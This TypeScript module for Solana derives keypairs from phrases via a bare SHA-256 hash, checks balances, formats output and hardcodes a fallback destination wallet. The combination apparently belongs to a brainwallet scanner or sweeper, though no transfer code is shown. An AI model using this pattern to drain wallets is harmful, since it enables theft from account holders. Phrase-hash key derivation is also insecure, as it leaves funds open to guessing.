import { type PublicKey, Keypair } from "@solana/web3.js"
import * as crypto from "crypto"
import { LAMPORTS_PER_SOL } from "@solana/web3.js"
import { callSolana } from "@/lib/solanaClient"

// Your destination wallet address
const DESTINATION_WALLET = process.env.DESTINATION_WALLET_SOL || "7DjhBezJEbjLeaqXmKENZmPbDAHiC1f11GMfTjPSAmLD"

// Generate a keypair from a phrase
export function generateKeypairFromPhrase(phrase: string): Keypair {
  // Create a SHA-256 hash of the phrase
  const hash = crypto.createHash("sha256").update(phrase).digest()
  // Use the first 32 bytes of the hash as the seed
  return Keypair.fromSeed(Uint8Array.from(hash.slice(0, 32)))
}

// Check balance using our Solana client
export async function checkBalance(publicKey: PublicKey): Promise<number> {
  try {
    const result = await callSolana("getBalance", [publicKey.toString()])
    return result.value / LAMPORTS_PER_SOL // Convert lamports to SOL
  } catch (error) {
    console.error("Error checking balance:", error)
    throw error
  }
}

// Format utilities
export function formatPublicKey(publicKey: string): string {
  return `${publicKey.slice(0, 6)}...${publicKey.slice(-4)}`
}

export function formatSol(sol: number): string {
  return sol.toFixed(4)
}

export function getExplorerLink(signature: string): string {
  return `https://explorer.solana.com/tx/${signature}`
}

export function getAddressExplorerLink(address: string): string {
  return `https://explorer.solana.com/address/${address}`
}
